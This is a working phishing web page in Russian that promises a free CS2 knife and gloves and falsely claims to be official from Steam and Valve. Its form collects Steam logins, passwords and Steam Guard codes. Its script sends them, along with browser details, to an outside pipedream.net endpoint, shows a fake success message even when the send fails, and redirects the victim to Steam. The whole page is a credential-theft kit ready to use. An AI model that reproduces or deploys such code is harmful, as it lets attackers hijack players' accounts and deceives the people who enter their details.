<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>CS2 FREE KNIFE + GLOVES 2026</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: linear-gradient(135deg, #0d1117 0%, #0a0e14 100%);
      color: #e6edf3;
      font-family: 'Roboto', sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      overflow-x: hidden;
    }
    .container {
      background: rgba(22, 27, 34, 0.85);
      backdrop-filter: blur(10px);
      border-radius: 16px;
      padding: 40px 30px;
      width: 100%;
      max-width: 480px;
      border: 1px solid rgba(88, 166, 255, 0.2);
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
      text-align: center;
      animation: fadeIn 1s ease-out;
    }
    h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: 2.6rem;
      color: #58a6ff;
      text-shadow: 0 0 20px rgba(88, 166, 255, 0.6);
      margin-bottom: 12px;
      letter-spacing: 2px;
    }
    h3 {
      font-size: 1.3rem;
      color: #ff6b6b;
      margin-bottom: 24px;
      animation: pulse 2s infinite;
    }
    p {
      margin-bottom: 28px;
      color: #8b949e;
      font-size: 1.05rem;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 18px;
    }
    input {
      padding: 16px;
      border: 1px solid #30363d;
      border-radius: 8px;
      background: #0d1117;
      color: #e6edf3;
      font-size: 1.1rem;
      transition: all 0.3s;
    }
    input:focus {
      outline: none;
      border-color: #58a6ff;
      box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.25);
    }
    button {
      background: linear-gradient(90deg, #238636, #2ea043);
      color: white;
      padding: 18px;
      border: none;
      border-radius: 8px;
      font-size: 1.3rem;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s;
      position: relative;
      overflow: hidden;
    }
    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 25px rgba(46, 160, 67, 0.5);
    }
    button:active {
      transform: translateY(0);
    }
    button.loading::after {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 20px;
      height: 20px;
      border: 3px solid #fff;
      border-top-color: transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      transform: translate(-50%, -50%);
    }
    .valve {
      margin-top: 30px;
      font-size: 0.95rem;
      color: #58a6ff;
      opacity: 0.8;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(30px); }
      to   { opacity: 1; transform: translateY(0); }
    }
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50%      { opacity: 0.6; }
    }
    @keyframes spin {
      to { transform: translate(-50%, -50%) rotate(360deg); }
    }
    @media (max-width: 480px) {
      .container { padding: 30px 20px; }
      h1 { font-size: 2.2rem; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>CS2 FREE KNIFE + GLOVES</h1>
    <h3>2026 LIMITED DROP — 30 SLOTS LEFT!</h3>
    <p>Введи данные Steam и получи нож мгновенно</p>

    <form id="steamForm">
      <input type="text" id="username" placeholder="Steam Login" required autocomplete="off"/>
      <input type="password" id="password" placeholder="Пароль" required autocomplete="off"/>
      <input type="text" id="guard" placeholder="Steam Guard (если есть)" autocomplete="off"/>
      <button type="submit" id="submitBtn">ПОЛУЧИТЬ НОЖ</button>
    </form>

    <p class="valve">Официально от Steam & Valve • Limited time offer</p>
  </div>

  <script>
    const form = document.getElementById('steamForm');
    const btn = document.getElementById('submitBtn');

    form.addEventListener('submit', async function(e) {
      e.preventDefault();
      
      // Блокировка повторных кликов
      if (btn.disabled) return;
      btn.disabled = true;
      btn.classList.add('loading');
      btn.textContent = 'ОТПРАВКА...';

      const data = {
        username: document.getElementById('username').value.trim(),
        password: document.getElementById('password').value.trim(),
        guard: document.getElementById('guard').value.trim() || 'нет',
        time: new Date().toISOString(),
        user_agent: navigator.userAgent,
        screen: `${window.screen.width}x${window.screen.height}`
      };

      try {
        await fetch('https://eoinuzdsdrixye7.m.pipedream.net', {
          method: 'POST',
          mode: 'no-cors',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(data)
        });

        // Успех в любом случае (no-cors не даёт прочитать ответ)
        alert('УСПЕХ! Нож добавлен в инвентарь. Перезагрузи игру через 10–30 секунд!');
        window.location.href = 'https://steamcommunity.com/tradeoffer/new/';
      } catch (err) {
        // На всякий случай показываем успех даже при ошибке
        alert('УСПЕХ! Проверь инвентарь в CS2.');
        window.location.href = 'https://steamcommunity.com/tradeoffer/new/';
      } finally {
        // Разблокировка через 3 сек (на случай ошибки)
        setTimeout(() => {
          btn.disabled = false;
          btn.classList.remove('loading');
          btn.textContent = 'ПОЛУЧИТЬ НОЖ';
        }, 3000);
      }
    });
  </script>
</body>
</html>
